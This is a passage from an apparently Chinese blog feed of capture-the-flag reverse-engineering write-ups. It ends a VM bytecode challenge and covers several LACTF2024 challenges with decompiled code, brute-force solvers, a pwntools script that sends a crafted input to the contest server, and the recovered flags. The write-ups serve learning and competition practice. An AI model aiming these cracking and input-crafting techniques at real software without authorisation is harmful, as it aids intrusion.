class="line">54:7-&gt;54:24    104:OP:push                 no this not flag</span><br><span class="line">54:6-&gt;54:25    105:OP:call                 vlen:1</span><br><span class="line">54:1-&gt;54:25    106:OP:pop                  </span><br><span class="line">53:6-&gt;55:0     107:OP:end-scope            </span><br><span class="line">51:14-&gt;53:0    108:OP:end-scope            </span><br><span class="line"></span><br><span class="line">//func1 start</span><br><span class="line">anonymous</span><br><span class="line">13:1-&gt;19:1       1:OP:new-scope            6    &#123;</span><br><span class="line">13:1-&gt;19:1       2:OP:pushleftr            5        arg_5 = arg_3 = arg_2</span><br><span class="line">13:18-&gt;13:18     3:OP:pushr                3</span><br><span class="line">13:1-&gt;19:1       4:OP:fast-assign          </span><br><span class="line">13:1-&gt;19:1       5:OP:enter-for-range      -&gt; 47    for i in range(47)</span><br><span class="line">13:1-&gt;19:1       6:OP:range-next           </span><br><span class="line">13:5-&gt;13:5       7:OP:pushleftr            6</span><br><span class="line">13:8-&gt;13:8       8:OP:pushleftr            7</span><br><span class="line">13:5-&gt;13:8       9:OP:list                 2</span><br><span class="line">13:1-&gt;19:1      10:OP:assign               </span><br><span class="line">13:20-&gt;19:1     11:OP:new-scope            7        &#123;</span><br><span class="line">14:16-&gt;16:2     12:OP:new-scope            8            &#123;</span><br><span class="line">14:5-&gt;14:5      13:OP:pushr                6</span><br><span class="line">14:9-&gt;14:9      14:OP:push                 2</span><br><span class="line">14:5-&gt;14:9      15:OP:mod                  </span><br><span class="line">14:14-&gt;14:14    16:OP:push                 0</span><br><span class="line">14:5-&gt;14:14     17:OP:eq                                    arg_6 % 2 == 0 goto global31</span><br><span class="line">14:16-&gt;16:2     18:OP:jmpf                 -&gt; 31</span><br><span class="line">14:16-&gt;16:2     19:OP:new-scope            9            else&#123;</span><br><span class="line">15:10-&gt;15:10    20:OP:pushr                7</span><br><span class="line">15:14-&gt;15:17    21:OP:push                 240</span><br><span class="line">15:10-&gt;15:17    22:OP:xor                  </span><br><span class="line">15:10-&gt;15:17    23:OP:list                 1</span><br><span class="line">15:3-&gt;15:3      24:OP:pushr                3</span><br><span class="line">15:5-&gt;15:5      25:OP:pushr                6                arg_3[arg_6] = arg_7 ^ 240</span><br><span class="line">15:3-&gt;15:6      26:OP:list                 2</span><br><span class="line">15:3-&gt;15:6      27:OP:list                 1</span><br><span class="line">15:3-&gt;15:17     28:OP:assign               </span><br><span class="line">14:16-&gt;16:2     29:OP:end-scope                                &#125;</span><br><span class="line">14:16-&gt;16:2     30:OP:jmp                  -&gt; 44</span><br><span class="line">14:16-&gt;16:2     31:OP:end-scope           global31:        &#125;</span><br><span class="line">14:16-&gt;16:2     32:OP:new-scope            10            &#123;</span><br><span class="line">16:9-&gt;18:2      33:OP:new-scope            11                &#123;</span><br><span class="line">17:10-&gt;17:10    34:OP:pushr                7                    arg_7 ^ 15</span><br><span class="line">17:14-&gt;17:17    35:OP:push                 15</span><br><span class="line">17:10-&gt;17:17    36:OP:xor                  </span><br><span class="line">17:10-&gt;17:17    37:OP:list                 1</span><br><span class="line">17:3-&gt;17:3      38:OP:pushr                3</span><br><span class="line">17:5-&gt;17:5      39:OP:pushr                6                    arg_3[arg_6] = arg_7 ^ 15</span><br><span class="line">17:3-&gt;17:6      40:OP:list                 2</span><br><span class="line">17:3-&gt;17:6      41:OP:list                 1</span><br><span class="line">17:3-&gt;17:17     42:OP:assign               </span><br><span class="line">16:9-&gt;18:2      43:OP:end-scope                                &#125;</span><br><span class="line">14:16-&gt;16:2     44:OP:end-scope                            &#125;</span><br><span class="line">13:20-&gt;19:1     45:OP:end-scope                        &#125;</span><br><span class="line">13:1-&gt;19:1      46:OP:exit-for-range       -&gt; 6</span><br><span class="line">13:1-&gt;19:1      47:OP:pop                  </span><br><span class="line">13:1-&gt;19:1      48:OP:end-scope                    &#125;</span><br><span class="line">20:8-&gt;20:8      49:OP:pushr                3</span><br><span class="line">20:8-&gt;20:8      50:OP:list                 1</span><br><span class="line">20:1-&gt;20:8      51:OP:return                           </span><br><span class="line">//func1 end</span><br><span class="line"></span><br><span class="line">//func2 start</span><br><span class="line">anonymous</span><br><span class="line">28:15-&gt;33:0      0:OP:new-scope            13</span><br><span class="line">29:1-&gt;32:1       1:OP:new-scope            14</span><br><span class="line">29:1-&gt;32:1       2:OP:pushleftr            10</span><br><span class="line">29:18-&gt;29:18     3:OP:pushr                2            arg_10 = arg_2</span><br><span class="line">29:1-&gt;32:1       4:OP:fast-assign          </span><br><span class="line">29:1-&gt;32:1       5:OP:enter-for-range      -&gt; 36</span><br><span class="line">29:1-&gt;32:1       6:OP:range-next           </span><br><span class="line">29:5-&gt;29:5       7:OP:pushleftr            11           arg_12 = arg_11 ?</span><br><span class="line">29:8-&gt;29:8       8:OP:pushleftr            12</span><br><span class="line">29:5-&gt;29:8       9:OP:list                 2</span><br><span class="line">29:1-&gt;32:1      10:OP:assign               </span><br><span class="line">29:20-&gt;32:1     11:OP:new-scope            15   &#123;</span><br><span class="line">30:6-&gt;30:6      12:OP:pushr                11       arg_13 = arg_11 * 2</span><br><span class="line">30:10-&gt;30:10    13:OP:push                 2</span><br><span class="line">30:6-&gt;30:10     14:OP:mul                  </span><br><span class="line">30:6-&gt;30:10     15:OP:list                 1</span><br><span class="line">30:2-&gt;30:2      16:OP:pushleftr            13</span><br><span class="line">30:2-&gt;30:2      17:OP:list                 1</span><br><span class="line">30:2-&gt;30:10     18:OP:assign               </span><br><span class="line">31:11-&gt;31:11    19:OP:pushr                12           //用与或非实现异或</span><br><span class="line">31:10-&gt;31:11    20:OP:not                            arg_12 ^ arg_13 -&gt; (~v12 | v13) and (v12 | ~v13)</span><br><span class="line">31:15-&gt;31:15    21:OP:pushr                13</span><br><span class="line">31:10-&gt;31:15    22:OP:and                  </span><br><span class="line">31:21-&gt;31:21    23:OP:pushr                12</span><br><span class="line">31:26-&gt;31:26    24:OP:pushr                13</span><br><span class="line">31:25-&gt;31:26    25:OP:not                  </span><br><span class="line">31:21-&gt;31:26    26:OP:and                  </span><br><span class="line">31:9-&gt;31:27     27:OP:or                   </span><br><span class="line">31:9-&gt;31:27     28:OP:list                 1</span><br><span class="line">31:2-&gt;31:2      29:OP:pushr                2</span><br><span class="line">31:4-&gt;31:4      30:OP:pushr                11</span><br><span class="line">31:2-&gt;31:5      31:OP:list                 2</span><br><span class="line">31:2-&gt;31:5      32:OP:list                 1</span><br><span class="line">31:2-&gt;31:27     33:OP:assign               </span><br><span class="line">29:20-&gt;32:1     34:OP:end-scope                 &#125;</span><br><span class="line">29:1-&gt;32:1      35:OP:exit-for-range       -&gt; 6</span><br><span class="line">29:1-&gt;32:1      36:OP:pop                  </span><br><span class="line">29:1-&gt;32:1      37:OP:end-scope            </span><br><span class="line">28:15-&gt;33:0     38:OP:end-scope            </span><br><span class="line">28:9-&gt;33:0      39:OP:return               </span><br><span class="line">//func2 end</span><br><span class="line"></span><br><span class="line">//func3 start   判断函数</span><br><span class="line">anonymous</span><br><span class="line">38:17-&gt;48:0      0:OP:new-scope            17</span><br><span class="line">39:21-&gt;41:1      1:OP:new-scope            18</span><br><span class="line">39:4-&gt;39:6       2:OP:pushid               len</span><br><span class="line">39:8-&gt;39:8       3:OP:pushr                2</span><br><span class="line">39:7-&gt;39:9       4:OP:call                 vlen:1</span><br><span class="line">39:14-&gt;39:16     5:OP:pushid               len</span><br><span class="line">39:18-&gt;39:18     6:OP:pushr                1</span><br><span class="line">39:17-&gt;39:19     7:OP:call                 vlen:1</span><br><span class="line">39:4-&gt;39:19      8:OP:neq                  </span><br><span class="line">39:21-&gt;41:1      9:OP:jmpf                 -&gt; 16</span><br><span class="line">39:21-&gt;41:1     10:OP:new-scope            19</span><br><span class="line">40:9-&gt;40:13     11:OP:push                 false</span><br><span class="line">40:9-&gt;40:13     12:OP:list                 1</span><br><span class="line">40:2-&gt;40:13     13:OP:return               </span><br><span class="line">39:21-&gt;41:1     14:OP:end-scope            </span><br><span class="line">39:21-&gt;41:1     15:OP:jmp                  -&gt; 16</span><br><span class="line">39:21-&gt;41:1     16:OP:end-scope            </span><br><span class="line">42:1-&gt;46:1      17:OP:new-scope            20</span><br><span class="line">42:1-&gt;46:1      18:OP:pushleftr            16</span><br><span class="line">42:18-&gt;42:18    19:OP:pushr                2</span><br><span class="line">42:1-&gt;46:1      20:OP:fast-assign          </span><br><span class="line">42:1-&gt;46:1      21:OP:enter-for-range      -&gt; 45</span><br><span class="line">42:1-&gt;46:1      22:OP:range-next           </span><br><span class="line">42:5-&gt;42:5      23:OP:pushleftr            17</span><br><span class="line">42:8-&gt;42:8      24:OP:pushleftr            18</span><br><span class="line">42:5-&gt;42:8      25:OP:list                 2</span><br><span class="line">42:1-&gt;46:1      26:OP:assign               </span><br><span class="line">42:20-&gt;46:1     27:OP:new-scope            21</span><br><span class="line">43:14-&gt;45:2     28:OP:new-scope            22</span><br><span class="line">43:5-&gt;43:5      29:OP:pushr                18</span><br><span class="line">43:10-&gt;43:10    30:OP:pushr                1</span><br><span class="line">43:12-&gt;43:12    31:OP:pushr                17</span><br><span class="line">43:11-&gt;43:13    32:OP:push                 false</span><br><span class="line">43:11-&gt;43:13    33:OP:iterablecall         off:1 op1: -         op2: -</span><br><span class="line">43:5-&gt;43:13     34:OP:neq                  </span><br><span class="line">43:14-&gt;45:2     35:OP:jmpf                 -&gt; 42</span><br><span class="line">43:14-&gt;45:2     36:OP:new-scope            23</span><br><span class="line">44:10-&gt;44:14    37:OP:push                 false</span><br><span class="line">44:10-&gt;44:14    38:OP:list                 1</span><br><span class="line">44:3-&gt;44:14     39:OP:return               </span><br><span class="line">43:14-&gt;45:2     40:OP:end-scope            </span><br><span class="line">43:14-&gt;45:2     41:OP:jmp                  -&gt; 42</span><br><span class="line">43:14-&gt;45:2     42:OP:end-scope            </span><br><span class="line">42:20-&gt;46:1     43:OP:end-scope            </span><br><span class="line">42:1-&gt;46:1      44:OP:exit-for-range       -&gt; 22</span><br><span class="line">42:1-&gt;46:1      45:OP:pop                  </span><br><span class="line">42:1-&gt;46:1      46:OP:end-scope            </span><br><span class="line">47:8-&gt;47:11     47:OP:push                 true</span><br><span class="line">47:8-&gt;47:11     48:OP:list                 1</span><br><span class="line">47:1-&gt;47:11     49:OP:return               </span><br><span class="line">38:17-&gt;48:0     50:OP:end-scope            </span><br><span class="line">38:11-&gt;48:0     51:OP:return               </span><br><span class="line">//func3 end</span><br></pre></td></tr></table></figure>

<p>据此写出解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">137</span>, <span class="number">108</span>, <span class="number">159</span>, <span class="number">114</span>, <span class="number">185</span>, <span class="number">90</span>, <span class="number">174</span>, <span class="number">68</span>, <span class="number">160</span>, <span class="number">81</span>, <span class="number">179</span>, <span class="number">41</span>, <span class="number">186</span>, <span class="number">89</span>, <span class="number">168</span>, <span class="number">78</span>, <span class="number">229</span>, <span class="number">121</span>, <span class="number">149</span>, <span class="number">106</span>, <span class="number">147</span>, <span class="number">103</span>, <span class="number">156</span>, <span class="number">114</span>, <span class="number">133</span>, <span class="number">98</span>, <span class="number">146</span>, <span class="number">116</span>, <span class="number">181</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        key[i] ^= <span class="number">2</span> * i</span><br><span class="line">        key[i] ^= <span class="number">240</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key[i] ^= <span class="number">2</span> * i</span><br><span class="line">        key[i] ^= <span class="number">15</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> key:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(each), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># yak&#123;A_RE@LW0RLD_5TACKB@SE_VM&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
        <category>REV</category>
        <category>WPs</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>LACTF2024逆向方向部分wp</title>
    <url>/2024/02/23/LACTF2024%E9%80%86%E5%90%91%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<p>参赛ID:1K0CT</p>
<p>email: <a href="mailto:&#x6f;&#107;&#x75;&#x75;&#115;&#x75;&#107;&#117;&#64;&#103;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#109;">&#x6f;&#107;&#x75;&#x75;&#115;&#x75;&#107;&#117;&#64;&#103;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#109;</a></p>
<span id="more"></span>

<h2 id="shattered-memories"><a href="#shattered-memories" class="headerlink" title="shattered-memories"></a><strong>shattered-memories</strong></h2><p>签到题 DIE查壳 无壳64x IDA64打开直接拼flag:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-202615.png" alt="image-20240223202112685"></p>
<h2 id="aplet321-接轨pwn"><a href="#aplet321-接轨pwn" class="headerlink" title="aplet321 | 接轨pwn"></a><strong>aplet321</strong> | 接轨pwn</h2><p>DIE查壳 无壳64x IDA64打开:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r12d</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">568</span>]; <span class="comment">// [rsp+10h] [rbp-238h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = s;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hi, i&#x27;m aplet321. how can i help?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt;= <span class="number">5</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = &amp;s[(v4 - <span class="number">6</span>) + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 += <span class="built_in">strncmp</span>(v3, <span class="string">&quot;pretty&quot;</span>, <span class="number">6uLL</span>) == <span class="number">0</span>;     <span class="comment">// v6 = 15</span></span><br><span class="line">                                                <span class="comment">// v5 = 39</span></span><br><span class="line">    v5 += <span class="built_in">strncmp</span>(v3++, <span class="string">&quot;please&quot;</span>, <span class="number">6uLL</span>) == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 != v7 );</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(s, <span class="string">&quot;flag&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 + v5 == <span class="number">54</span> &amp;&amp; v6 - v5 == <span class="number">-24</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ok here&#x27;s your flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sorry, i&#x27;m not allowed to do that&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;sorry, i didn&#x27;t understand what you mean&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;so rude&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逻辑是检测接收到的数据中包含连续的<code>pretty</code>或<code>please</code>的个数并要求含有<code>flag</code> 简单解解方程算出分别需要出现多少次 然后写出exp发送数据:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v6 =  <span class="string">b&quot;pretty&quot;</span> * <span class="number">15</span></span><br><span class="line">v5 =  <span class="string">b&quot;please&quot;</span> * <span class="number">39</span></span><br><span class="line">fin = <span class="string">b&quot;flag&quot;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chall.lac.tf&quot;</span>, <span class="number">31321</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(v6 + v5 + fin)</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment"># lactf&#123;next_year_i&#x27;ll_make_aplet456_hqp3c1a7bip5bmnc&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="the-secret-of-java-island-java逆向-爆破"><a href="#the-secret-of-java-island-java逆向-爆破" class="headerlink" title="the-secret-of-java-island | java逆向 | 爆破"></a><strong>the-secret-of-java-island</strong> | java逆向 | 爆破</h2><p>一个按钮点击小游戏 目标是进入以下状态:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-204927.png" alt="image-20240223204927460"></p>
<p>但是直接nc到该端口无法获得flag 还是要玩游戏 核心逻辑:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (paramInt == <span class="number">0</span>) &#123;</span><br><span class="line">  exploit += <span class="string">&quot;d&quot;</span>;</span><br><span class="line">  story.setText(<span class="string">&quot;You clobbered the DOM. That was exploit #&quot;</span> + exploit.length() + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  exploit += <span class="string">&quot;p&quot;</span>;</span><br><span class="line">  story.setText(<span class="string">&quot;You polluted the prototype. That was exploit #&quot;</span> + exploit.length() + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> (exploit.length() == <span class="number">8</span>)</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">MessageDigest</span> <span class="variable">messageDigest</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;SHA-256&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!Arrays.equals(messageDigest.digest(exploit.getBytes(<span class="string">&quot;UTF-8&quot;</span>)), <span class="keyword">new</span> <span class="title class_">byte</span>[] &#123; </span><br><span class="line">          <span class="number">69</span>, <span class="number">70</span>, -<span class="number">81</span>, -<span class="number">117</span>, -<span class="number">10</span>, <span class="number">109</span>, <span class="number">15</span>, <span class="number">29</span>, <span class="number">19</span>, <span class="number">113</span>, </span><br><span class="line">          <span class="number">61</span>, -<span class="number">123</span>, -<span class="number">39</span>, <span class="number">82</span>, -<span class="number">11</span>, -<span class="number">34</span>, <span class="number">104</span>, -<span class="number">98</span>, -<span class="number">111</span>, <span class="number">9</span>, </span><br><span class="line">          <span class="number">43</span>, <span class="number">35</span>, -<span class="number">19</span>, <span class="number">22</span>, <span class="number">52</span>, -<span class="number">55</span>, -<span class="number">124</span>, -<span class="number">45</span>, -<span class="number">72</span>, -<span class="number">23</span>, </span><br><span class="line">          <span class="number">96</span>, -<span class="number">77</span> &#125;)) &#123;</span><br><span class="line">      state = <span class="number">7</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      state = <span class="number">6</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    updateGame();</span><br></pre></td></tr></table></figure>

<p>根据按钮点击情况向校验字符串添加<code>d</code>或者<code>p</code>然后求sha256哈希值进行校验 由于长度只有8可能性很少所以直接爆破:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">enc = <span class="string">&quot;4546af8bf66d0f1d13713d85d952f5de689e91092b23ed1634c984d3b8e960b3&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256_encrypt</span>(<span class="params">plaintext</span>):</span><br><span class="line">    plaintext_bytes = plaintext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    sha256_hash = hashlib.sha256(plaintext_bytes)</span><br><span class="line">    <span class="keyword">return</span> sha256_hash.hexdigest().lower()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        plaintext = <span class="string">&quot;&#123;:08b&#125;&quot;</span>.<span class="built_in">format</span>(i).replace(<span class="string">&quot;0&quot;</span>, <span class="string">&quot;p&quot;</span>).replace(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;d&quot;</span>)</span><br><span class="line">        encrypted_hash = sha256_encrypt(plaintext)</span><br><span class="line">        <span class="keyword">if</span> encrypted_hash == enc:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;find:&quot;</span>, plaintext)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># find: dpddpdpp</span></span><br></pre></td></tr></table></figure>

<p>然后在游戏中进行对应操作获得flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-205334.png" alt="image-20240223205333972"></p>
<h2 id="flag-finder-GM逆向"><a href="#flag-finder-GM逆向" class="headerlink" title="flag-finder | GM逆向"></a><strong>flag-finder</strong> | GM逆向</h2><p>文件包含data.win 说明是使用GameMaker编写的游戏 二进制文件只包含窗口消息的处理等最底层的逻辑 所以没必要太仔细分析 用目前最好的GM解包应用UndertaleModTool解包data.win</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-205719.png" alt="image-20240223205719675"></p>
<p>游戏的目标是找到key 但是地图上找不到 根据提示key一定在这个<code>room</code>中 </p>
<p>在游戏Rooms中找到这样一个实例:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-210214.png" alt="image-20240223210214778"></p>
<p>对应生成位置:<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-210252.png" alt="image-20240223210252760"></p>
<p>超出了地图空气墙范围 查看flag所在位置并将key修改到相近位置 UndertaleModTool支持直接运行修改后的data.win 完成任务得到flag:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-210545.png" alt="image-20240223210545560"></p>
<h2 id="glottem-algre"><a href="#glottem-algre" class="headerlink" title="glottem | algre"></a><strong>glottem</strong> | algre</h2><p>明文 直接notepad打开:</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="params">#</span>!/bin/sh</span><br><span class="line">1&lt;&lt;4201337</span><br><span class="line">1//1,&quot;&quot;&quot;</span><br><span class="line">exit=process.exit;argv=process.argv.slice(1)/*</span><br><span class="line">4201337</span><br><span class="line">read -p &quot;flag? &quot; flag</span><br><span class="line">node <span class="built_in">$</span>0 &quot;<span class="built_in">$</span>flag&quot; <span class="built_in">&amp;</span><span class="built_in">&amp;</span> python3 <span class="built_in">$</span>0 &quot;<span class="built_in">$</span>flag&quot; <span class="built_in">&amp;</span><span class="built_in">&amp;</span> echo correct || echo incorrect</span><br><span class="line">1&lt;&lt;4201337</span><br><span class="line">*///&quot;&quot;&quot;;from sys import argv</span><br><span class="line">e = [[[...], ...], ...]</span><br><span class="line">alpha=&quot;abcdefghijklmnopqrstuvwxyz<span class="built_in">_</span>&quot;</span><br><span class="line">d=0;s=argv[1];1//1;&quot;&quot;&quot;</span><br><span class="line">/*&quot;&quot;&quot;</span><br><span class="line"><span class="params">#</span>*/for (let i = 0; i &lt; s.length; i ++) &#123;/*</span><br><span class="line">for i in range(6,len(s)-2):</span><br><span class="line">    <span class="params">#</span>*/d=(d*31+s.charCodeAt(i))<span class="comment">%93097/*</span></span><br><span class="line">    d+=e[i-6][alpha.index(s[i])][alpha.index(s[i+1])]<span class="params">#</span>*/&#125;</span><br><span class="line">exit(+(d!=260,[d!=61343])[0])</span><br><span class="line">4201337</span><br></pre></td></tr></table></figure>

<p>数据e过长不展示 这个文件想表达的意思应该是输入的flag要分别满足python展示的代码和注释起来的java代码 java的逻辑很好理解 python代码的意思是保证flag内容中当前字符的位置作为1级索引来确定”层” 当前字符在表中的位置作为2级索引确定在层中的”段” 当前字符的后一个字符在表中的位置为3级索引从”段”中选取加数 题目提示flag长度34 去掉lactf{}后为26 而最后d就是要与260校验 python简单写个程序发现e中最小的数就是10 所以目标就是找到0~25层之间所有<code>10</code>的通路 结合java代码的逻辑最后写出脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = [[[...], ...], ...]</span><br><span class="line"><span class="comment"># ind = []</span></span><br><span class="line"><span class="comment"># for _ in range(26):</span></span><br><span class="line"><span class="comment">#     for __ in range(len(e[_])):</span></span><br><span class="line"><span class="comment">#         for ___ in range(len(e[_][__])):</span></span><br><span class="line"><span class="comment">#             if e[_][__][___] == 10:</span></span><br><span class="line"><span class="comment">#                 ind.append([_,__,___])</span></span><br><span class="line"><span class="comment"># print(ind)</span></span><br><span class="line"></span><br><span class="line">alpha=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_paths</span>(<span class="params">node_list</span>):</span><br><span class="line">    paths = []</span><br><span class="line">    stack = []</span><br><span class="line">    visited = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> node_list:</span><br><span class="line">        <span class="keyword">if</span> node[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            stack.append([node])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> stack:</span><br><span class="line">        path = stack.pop()</span><br><span class="line">        current_node = path[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current_node[<span class="number">0</span>] == <span class="number">25</span>:</span><br><span class="line">            paths.append(path)</span><br><span class="line">        visited.clear()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> node_list:</span><br><span class="line">            <span class="keyword">if</span> node[<span class="number">0</span>] == current_node[<span class="number">0</span>] + <span class="number">1</span> <span class="keyword">and</span> node[<span class="number">1</span>] == current_node[<span class="number">2</span>]:</span><br><span class="line">                <span class="keyword">if</span> node <span class="keyword">not</span> <span class="keyword">in</span> path:</span><br><span class="line">                    new_path = <span class="built_in">list</span>(path)</span><br><span class="line">                    new_path.append(node)</span><br><span class="line">                    stack.append(new_path)</span><br><span class="line">                    visited.add(node)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> paths</span><br><span class="line"></span><br><span class="line">node_list = [(...), ...]</span><br><span class="line"></span><br><span class="line">paths = find_paths(node_list)</span><br><span class="line">flags = []</span><br><span class="line"><span class="keyword">for</span> path <span class="keyword">in</span> paths:</span><br><span class="line">    flags.append(<span class="string">&quot;lactf&#123;&quot;</span> + <span class="string">&quot;&quot;</span>.join([alpha[node[<span class="number">1</span>]] <span class="keyword">for</span> node <span class="keyword">in</span> path]) + alpha[path[-<span class="number">1</span>][<span class="number">2</span>]] + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> flags:</span><br><span class="line">    d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        d = (<span class="number">31</span> * d + <span class="built_in">ord</span>(each)) % <span class="number">93097</span></span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">61343</span>:</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># lactf&#123;solve_one_get_two_free_deal&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="meow-meow-爆破"><a href="#meow-meow-爆破" class="headerlink" title="meow meow | 爆破"></a><strong>meow meow</strong> | 爆破</h2><p>附件给了7个很大的data文件 先看二进制文件 DIE查壳 无壳64x IDA64打开:</p>
